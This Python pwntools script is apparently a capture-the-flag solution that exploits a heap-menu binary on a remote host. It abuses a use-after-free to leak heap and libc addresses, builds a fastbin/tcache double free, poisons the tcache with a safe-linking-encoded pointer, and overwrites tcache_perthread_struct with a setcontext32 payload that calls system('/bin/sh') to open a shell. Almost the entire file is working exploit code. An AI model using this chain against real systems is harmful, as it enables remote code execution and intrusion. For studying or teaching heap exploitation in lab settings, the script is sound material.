from pwn import *
from setcontext32 import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#conn = process()
conn = remote("34.32.226.3", 1337)

def alloc(sz, content):
  conn.sendlineafter(b"> ", b"1")
  conn.sendlineafter(b"> ", str(sz).encode())
  if sz > 0:
    conn.sendlineafter(b"> ", content)
  else:
    conn.recvuntil(b"> ")

def free(idx):
  conn.sendlineafter(b"> ", b"2")
  conn.sendlineafter(b"> ", str(idx).encode())

def show(idx):
  conn.sendlineafter(b"> ", b"3")
  conn.sendlineafter(b"> ", str(idx).encode())

# basically the clean function won't remove consecutive freed chunks
# so we get an UAF if we alloc things with -1 as the size

alloc(-1, b"") # 0
alloc(-1, b"") # 1
alloc(0x360, b"snail") # 2
free(1) # will free 2

show(0) # will show 2
conn.recvuntil(b"data: ")
heap = (u64(conn.recv(5) + b"\0\0\0")<<12) - 0x11000
info("heap @ " + hex(heap))

alloc(-1, b"") # 0
alloc(-1, b"") # 1
alloc(0x1000, b"snail") # 2
alloc(0x10, b"snail") # padding
free(1) # will free 2

show(0) # will show 2
conn.recvuntil(b"data: ")
libc.address = u64(conn.recv(6) + b"\0\0") - 0x219ce0
info("libc @ " + hex(libc.address))

free(0)

# fill 0x70 tcache
for n in range(7):
  alloc(0x68, b"snail")
for n in range(2**9+2**8):
  alloc(-1, b"")
for n in range(2):
  alloc(0x68, b"snail")
for n in range(7):
  free(0)

# double free into 0x70 fastbin
free(3)
free(2)
free(0)

# empty tcache
for n in range(7):
  alloc(0x68, "snail")

# this poisons fastbin and then fastbin gets dumped into tcache for some reason
#alloc(0x48, p64((heap+0x280) ^ ((heap+0x132c0)>>12)))
alloc(0x68, p64((heap+0x230) ^ ((heap+0x12d80)>>12)))

dest, pl = setcontext32(
             libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
           )

alloc(0x68, b"snail")
alloc(0x68, b"snail")
alloc(0x68, p64(0) + p64(dest+0x400) + p64(0)*9 + p64(dest)) # this gets on top of tcache_perthread_struct, with a big size

alloc(0x408, pl[:0x400])
alloc(0x368, pl[0x400:])

# trigger
conn.sendline(b"2")

conn.interactive()
